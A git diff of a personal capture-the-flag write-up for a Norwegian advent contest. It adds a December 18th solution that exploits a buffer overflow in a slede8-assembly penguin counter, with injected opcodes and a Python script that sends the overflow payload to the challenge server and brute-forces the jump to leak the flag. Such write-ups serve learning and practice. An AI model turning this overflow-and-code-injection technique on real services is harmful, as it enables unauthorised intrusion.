@@ -4,6 +4,8 @@
 I just want to start of by saying that this is my first ever writeup, and the second CTF I have ever participated in (the first being NPST 2019). It being my first writeup means that I don't really have any clue what I'm doing, and I'm just writing whatever comes to mind. So please bear this in mind if you do decide to read through. 
 I will also be presenting how I solved the challenges, and not the fine-polished, perfect ways to do it. This is because in a CTF where your ranking is based on completion time, a messy, yet quick solution, is what gets you to the top. 
 
+I've also written everything without any form of spell check, and with minimal proofreading. Expect quite a few errors. 
+
 ## December 1st
 On the first day we receive an email on the website with a verification code `RUV{JgkJqPåGtFgvLwnKilgp}`. Our supervisor had however dropped this code in their salad, so we had to decrypt it. The code can easily be recognized to be caesaer cipher, as hinted by it being dropped in the salad. Upon decrypting it with a shift of 2, you received the first flag: `PST{HeiHoNåErDetJulIgjen}`
 
@@ -601,7 +603,116 @@ $ echo -n c9c36ccf-6a38-4281-b48f-d14db694d4a3 | md5sum
 The flag was then `PST{0ae06caf767ac7ebce290cfc57be6a6f}`
 
 ## December 18th
-TODO: this
+SPST has published an extremely advanced artifical intelligence on [their GitHub account](https://github.com/SydpolarSikkerhetstjeneste). [Their repository `kunstig-pingvinopptellingsintelligens` `(artifical penguin counting intelligence)`](https://github.com/SydpolarSikkerhetstjeneste/kunstig-pingvinopptellingsintelligens) contains the source code of a function that counts the number of penguin emojis in a given string. The code is ran on their website https://pingvin.spst.no/, where you can input a string, and it'll tell you the amount of penguins in the string.
+
+![Penguin Counter](media/penguin_counter.gif)
+
+The function that counts the amount of penguins is written in slede8 assembly, and is susceptible to an overflow vulnerability. The assembly program reads the input into a 128 byte long .DATA buffer. Since it reads until it hits the end of the input, instead of reading no more than 128 bytes of input, we can input more than 128 bytes of data to overwrite and execute our own code. Heres an excerpt from the assembly.
+```
+SETT r10, 0
+SETT r11, 1
+HOPP forbi
+
+flagg:
+.DATA ${Buffer.from(flag).join(",")},0
+
+print:
+LAST r2
+PLUSS r0, r11
+LIK r2, r10
+BHOPP print_ferdig
+SKRIV r2
+HOPP print
+print_ferdig:
+RETUR
+
+input_buffer:
+.DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+.DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+.DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+.DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+.DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+.DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+.DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+.DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+
+forbi:
+TUR les_input
+TUR tell_pingviner
+TUR skriv_svar
+fin:
+STOPP
+
+les_input:
+FINN input_buffer
+les_neste_input:
+LES r2
+; ULK r2, r11 ; dette funker ikke...    - (; this doesn't work...)
+LIK r2, r10
+BHOPP lest_ferdig
+LAGR r2
+PLUSS r0, r11
+HOPP les_neste_input
+
+
+lest_ferdig:
+RETUR
+```
+
+It reads until there is a nullbyte in the input `LIK r2, r10`, where r2 is the current input byte and r10 is 0x00. When it hits a nullbyte, it jumps to `lest_ferdig`, which returns it to the line `TUR tell_pingviner`. We can then fill the `input_buffer` with the code we want to execute, and then overwrite the line `TUR tell_pingviner` with a jump (HOPP) to the start of the input_buffer. To be able to jump we need to know the line number of the input_buffer, I did this by bruteforcing. In the start of `input_buffer` I wrote code that simply reads out the data in line 0x06, which is the line where the flag is. Since we know that the flag data ends with 0x00, we can read until we hit this value. This is the code I write to the start of the `input_buffer`, along with their opcodes.
+```
+04 02   LAST r2         ; loads the value at line held in r0 into r2 (r0 is set to 0x06, the line of the flag)
+07 2a   LIK r10, r2     ; if the value in r2 is 0x00, we've read the entire flag and can stop the program.
+f9 ef   BHOPP 0xeff     ; since STOPP's opcode is 00 00, we can't use it as the program reads input until it hits 00.
+55 b0   PLUSS r0, r11   ; increments the line number held in r0
+16 02   SKRIV r2        ; prints out the byte
+Y8 0Y   HOPP 0xYY       ; this line jumps back to the start of the loop, but we don't actually know which line it is on, so we have to bruteforce this
+```
+We now have the code we want to execute done, now we just need to overwrite the lines correctly to be able to execute this code. We need to fill up the remainder of the `input_buffer` + 1 additional line, and then we hit the line that `les_input` (or rather, `lest_ferdig`) returns to. We overwrite this line with `SETT r0, 0x06`, this is because when you load (LAST), it loads the value of the line number held in r0 (and r1) and the flag is at line 0x06. Then we add a jump that jumps to the start of `input_buffer`. Since we don't know where the start of `input_buffer` is, we have to bruteforce. If the flag is one byte long, `input_buffer` is at line 0x24. We can then assume that the flag is somewhere between 20 and 40 characters long, and bruteforce the start of `input_buffer`.
+
+Here is the final Python script I used to get the flag.
+```py
+import requests
+import json
+from base64 import urlsafe_b64encode
+
+for line_num in range(20, 40): # flag is probably between 20-40 chars long
+    line_num = hex(24+line_num)[2:] # there are 24 known bytes before the start of the input_buffer
+    if len(line_num) == 1:
+        line_num = '0' + line_num # shitty python thing to make sure the hex value is always 2 digits long. (01 instead of 1)
+
+    jmp = f'\n{line_num[1]}8 0{line_num[0]} \n' # opcode for jumping to the line. if the line is 35 in hex, the opcode to jump to the line will be 58 03
+
+    # loop in start of input_buffer
+    data = '''
+04 02 
+07 2a 
+f9 ef 
+55 b0 
+16 02 '''
+    data += jmp 
+
+    # fill up rest of input_buffer with junk data
+    loop_len = data.count(' ')
+    data += '0c ' * (128 - (loop_len)) # 128 is the length of the input input_buffer, and we subtract the opcodes we used in the loop
+
+    # after input_buffer
+    data += '0c 0c' # overwrite the line "TUR les_input" with junk data
+    data += '01 06' # this is the line we retun back to, so we execute this (SETT r0, 0x06) ()
+    data += jmp     # and then we jump to the start of the loop that reads the flag
+
+    input_b64 = urlsafe_b64encode(bytes.fromhex(data)).decode().replace('=', '%3D') # we then convert the data string to bytes, and base64 encode it, this is how the server expects the input
+
+    r = requests.get(url=f'https://pingvin.spst.no/.netlify/functions/count?input={input_b64}') # we send the input
+    
+    res = json.loads(r.text)
+    # a response from the server without errors looks like this: {'svar': [80, 83, 84, 123, 69, 118, 101, 114, 121, 111, 110, 101, 65, 98, 111, 97, 114, 100, 84, 104, 101, 78, 79, 80, 69, 83, 108, 101, 100, 101, 56, 125]}
+
+    if 'svar' in res and len(res['svar']) > 1:
+        print(''.join([chr(x) for x in res['svar']])) # since the response is sent back as integers, we convert the integers in 'svar' to characters
+        break
+```
+The script returns the flag `PST{EveryoneAboardTheNOPESlede8}`
 
 ## December 19th
 In today's email we were explained that the elf Sigurd had created a way to split a secret into X keys. Further, the algorithm is made in such a way where only a Y amount of keys is required to get the secret. The secret password to the Christmas present vault was split into 5 (X) keys, of which 3 (Y) of them were required to open the vault. Two of the keys were given to Santa Claus, 1 key to elf Reidar, 1 key to elf Sigurd and 1 key to elf Adrian. This means that the vault can either be opened by Santa Claus + one elf, or by all 3 elves. Santa Claus has however lost both his keys, it is necessary to get back the vault's secret. We are also told that Sigurd's favorite number is `6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151` and we were given the 3 secrets held by the elves:
